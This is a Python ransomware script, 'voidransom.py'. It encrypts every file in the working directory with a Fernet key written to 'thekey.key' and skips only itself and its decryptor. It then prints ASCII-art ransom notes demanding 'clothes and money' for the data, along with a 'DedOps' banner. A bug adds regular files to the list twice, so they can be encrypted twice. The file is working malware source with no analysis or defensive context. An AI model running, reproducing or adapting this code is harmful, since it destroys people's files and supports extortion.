#!/usr/bin/env python3

from cryptography.fernet import Fernet
import os

#find files

files = []

for file in os.listdir():
    if file == "voidransom.py" or file == "thekey.key" or file =="voiddecrypt.py":
        continue
    files.append(file)
    if os.path.isfile(file):
        files.append(file)


#create key

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#encryption process

for file in  files:
        with open(file, "rb") as thefile:
             contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
             thefile.write(contents_encrypted)



# ransom note

ascii_note = r"""
 _ _   _    _ _                                _       _          _     
( | ) / \  | | |  _   _  ___  _   _ _ __    __| | __ _| |_ __ _  (_)___ 
 V V / _ \ | | | | | | |/ _ \| | | | '__|  / _` |/ _` | __/ _` | | / __|
    / ___ \| | | | |_| | (_) | |_| | |    | (_| | (_| | || (_| | | \__ \
   /_/   \_\_|_|  \__, |\___/ \__,_|_|     \__,_|\__,_|\__\__,_| |_|___/
                  |___/           _           _ _                       
  ___ _ __   ___ _ __ _   _ _ __ | |_ ___  __| | |                      
 / _ \ '_ \ / __| '__| | | | '_ \| __/ _ \/ _` | |                      
|  __/ | | | (__| |  | |_| | |_) | ||  __/ (_| |_|                      
 \___|_| |_|\___|_|   \__, | .__/ \__\___|\__,_(_)_                     
|  _ \| | ___  __ _ __|___/|_| ___  ___ _ __   __| |  _   _ _ __        
| |_) | |/ _ \/ _` / __|/ _ \ / __|/ _ \ '_ \ / _` | | | | | '_ \       
|  __/| |  __/ (_| \__ \  __/ \__ \  __/ | | | (_| | | |_| | |_) |      
|_|   |_|\___|\__,_|___/\___| |___/\___|_| |_|\__,_|  \__,_| .__/       
     _       _   _                           _             |_|          
 ___| | ___ | |_| |__  ___    __ _ _ __   __| |  _ __ ___   __ _ _   _  
/ __| |/ _ \| __| '_ \/ __|  / _` | '_ \ / _` | | '_ ` _ \ / _` | | | | 
\__ \ | (_) | |_| | | \__ \ | (_| | | | | (_| | | | | | | | (_| | |_| | 
|___/_|\___/ \__\_| |_|___/  \__,_|_| |_|\__,_| |_| |_| |_|\__,_|\__, | 
 / _|_ __ ___  ___  | |_| |__   ___    __| | __ _| |_ __ _| ( | )|___/  
| |_| '__/ _ \/ _ \ | __| '_ \ / _ \  / _` |/ _` | __/ _` | |V V        
|  _| | |  __/  __/ | |_| | | |  __/ | (_| | (_| | || (_| |_|           
|_| |_|  \___|\___|  \__|_| |_|\___|  \__,_|\__,_|\__\__,_(_)                                    
"""
print(ascii_note)

ascii_dedops = """
                                                                              
                                      ,----..                                 
    ,---,                            /   /   \                                
  .'  .' `\                  ,---,  /   .     : ,-.----.                      
,---.'     \               ,---.'| .   /   ;.  \\    /  \                     
|   |  .`\  |              |   | :.   ;   /  ` ;|   :    |  .--.--.           
:   : |  '  |   ,---.      |   | |;   |  ; \ ; ||   | .\ : /  /    '          
|   ' '  ;  :  /     \   ,--.__| ||   :  | ; | '.   : |: ||  :  /`./          
'   | ;  .  | /    /  | /   ,'   |.   |  ' ' ' :|   |  \ :|  :  ;_            
|   | :  |  '.    ' / |.   '  /  |'   ;  \; /  ||   : .  | \  \    `.         
'   : | /  ; '   ;   /|'   ; |:  | \   \  ',  / :     |`-'  `----.   \        
|   | '` ,/  '   |  / ||   | '/  '  ;   :    /  :   : :    /  /`--'  /        
;   :  .'    |   :    ||   :    :|   \   \ .'   |   | :   '--'.     /         
|   ,.'       \   \  /  \   \  /      `---`     `---'.|     `--'---'          
'---'          `----'    `----'                   `---`                       
"""

print(ascii_dedops)                                                           

ascii_art = """
  ⣿⣿⣿⣿⣿⠟⠋⠉⠀⠀⣀⠈⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠉⠈⣀⠀⠀⠉⠙⠿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠉⠙⠓⢶⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣥⡶⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿
⣿⣿⣿⢁⣀⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⣀⡘⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠛⣉⣉⣉⣏⣙⠛⠿⣿⣦⠈⣿⣿⣿⣿⣿⣿⣿⡟⢀⣴⡿⠿⠛⡋⣹⣍⣉⣉⠛⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣧⠹⣿⣿⡟⠁⠔⠉⠁⠀⠀⠀⠀⠈⠐⠀⠙⣷⣼⢸⣿⣿⣿⣿⡇⣧⡾⠉⠀⠊⠁⠀⠀⠀⠀⠈⠙⠢⠈⢻⣿⣿⢏⣽⣿
⣿⣿⠗⠈⠉⠀⠘⠤⠤⣀⣀⠀⡀⠀⠀⠤⠀⢀⣿⣿⢸⣿⣿⣿⣿⡇⣿⣷⡀⠠⠤⣀⡀⢀⡀⡀⡀⠤⠔⠃⢀⠉⠁⠺⢿⣿
⡿⢃⣴⣾⣿⣿⣷⣶⣤⣤⣄⣠⣇⣤⣴⣶⣾⣿⣿⡇⢸⣿⣿⣻⣿⡇⢻⣿⣿⣷⣶⣦⣤⣼⣄⣤⣤⣤⣶⣾⣿⣿⣷⣦⡘⢿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⢸⡟⣿⣿⣿⡇⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⣿⣿⣿⡇⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣠⣾⠀⣸⣿⣿⣿⣿⡇⢸⣦⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣏⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⣩⢁⣾⣿⣿⠀⣿⣿⣿⣿⣿⣧⠀⣿⣿⣦⢸⡇⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣻⣿
⣿⣿⡄⠈⢙⠛⠛⠛⢋⣉⣀⣤⣶⣾⣿⡌⣿⡟⢿⡀⠿⣿⣿⣿⣿⠟⢠⡿⠿⡟⣸⣿⣷⣦⣤⣈⣉⡙⠛⠛⠛⡋⠁⢰⣿⣿
⣿⣿⣷⠀⠘⣦⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣧⣤⡵⠦⣤⣭⣭⡤⠴⢥⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⢀⣾⠁⢀⣿⣿⣿
⣿⣿⣿⣧⠀⠸⣷⡀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⢀⡀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⢠⣾⠃⢀⣾⣿⣿⣿
⣿⣿⣿⣿⣧⠀⠙⣿⣄⠀⠈⠙⠛⠛⠉⠉⠉⠀⠀⠀⠀⣰⣿⣿⣄⠀⠀⠀⠀⠉⠉⠉⠙⠛⠋⠀⠀⣰⡿⠃⢀⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣧⡀⠈⠻⣦⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠾⠿⠿⠿⠿⠦⠀⠀⠀⣀⣀⣀⣀⣀⣀⣠⣾⠟⠀⢀⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣷⣄⠐⣦⡙⠿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⠟⣋⡴⠁⣠⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣦⡘⢿⣷⣶⣭⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣯⣭⣶⣾⡿⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⠟⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡙⢿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⢋⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""

print(ascii_art)